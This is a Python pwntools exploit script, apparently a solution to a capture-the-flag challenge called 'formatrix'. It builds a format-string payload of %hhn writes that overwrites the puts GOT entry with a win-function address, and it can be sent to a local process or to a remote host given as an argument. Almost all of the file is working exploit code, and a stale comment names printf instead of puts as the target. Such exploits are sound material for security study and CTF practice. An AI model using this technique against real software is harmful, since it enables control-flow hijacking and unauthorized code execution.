from pwn import *


PROGRAM_PATH = (Path(__file__).parent / "formatrix").resolve().__str__()

gdb_script = """
b *main+277
b *main+282
b *main+287
b *main+327
c
"""
frame_size = 0x600  # 1536
rbp = 8
buff_size = 0x200


def start(argv=[], *a, **kwargs):
    if args.GDB:
        return gdb.debug([PROGRAM_PATH] + argv, gdbscript=gdb_script, *a, **kwargs)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kwargs)
    else:
        return process([PROGRAM_PATH] + argv, *a, **kwargs)


WIN = 0x00000000004011D6
PRINTF_GOT = 0x0000000000403580
PUTS_GOT = 0x0000000000403568


io = start()
# print(io.got["printf"])
res = io.recvuntil(delims=": ")
print("____________________________________")

# payload = f"%{frame_size + rbp + 8*3}x"
# payload = f"%{frame_size + rbp + 8}p"
# payload = "AAAAAAAA%1$p|%2$p|%3$p|%4$p|%5$p|%6$p|%7$p|%8$p|%9$p|%10$p|%11$p|%12$p|%13$p|%14$p|%15$p|%16$p|%17$p|%18$p|%19$p|%20$p"
# # %hnn
# print(f"Sending payload: {payload}")
# Find the k value where our args are


# payload = b"A" * 8 + b"B" * 8 + b"C" * 8 + b"D" * 8
# fmt = "|".join(f"%{i}$p" for i in range(1, 0x200)).encode()
# io.send(payload + b"|" + fmt + b"\n")
# # Found the payload at k=5
# io.sendline(payload)

# fmt = %p%p%p%p%214c%hhn%p%59c%hhn%p%47c%hhn%p%192c%hhn%p%hhn%p%hhn%p%hhn%p%hhn


def build_fmt_hhn(k, target):
    """
    Return a format-program that writes 8 bytes (little-endian) of `target`
    using %hhn to the 8 pointers that will be the *next* varargs starting at index k.
    """
    # bytes we want at printf@GOT[0..7]
    b = [(target >> (8 * i)) & 0xFF for i in range(8)]
    # [0xd6, 0x11, 0x40, 0, 0, 0, 0, 0]
    # [214, , ]
    out = []
    C = 0  # chars printed so far
    # IMPORTANT: step 0 — consume up to the first fake-arg slot (k-1 varargs)
    # Use %p to move the va_list forward deterministically without affecting C much
    out.append("%p" * (k - 1))

    # Now the current vararg is our first pointer (PRINTF_GOT+0).
    # Do the 8 byte writes with %hhn
    for i, t in enumerate(b):
        pad = (t - (C % 256)) % 256
        if pad:
            out.append(f"%{pad}c")
            C += pad
        # %hhn stores the low byte of the count to the *current* vararg pointer
        out.append("%hhn")
        # advance to next pointer argument (we must consume one arg so the next %hhn hits the next p64)
        # easiest: use a dummy %p to advance the argument list by one
        if i != 7:
            out.append("%p")
    return "".join(out)


# res = io.recvuntil(b'"')
# print(res)
k = 5
fmt = build_fmt_hhn(k, WIN)
print(fmt)

# After the *textual* format, append our 8 destination pointers as binary.
ptrs = b"".join(p64(PUTS_GOT + i) for i in range(8))

payload = fmt.encode() + ptrs
print(f"Sending payload: {payload}")
print(f"Payload size: {len(payload)}")
io.sendline(payload)

io.interactive()
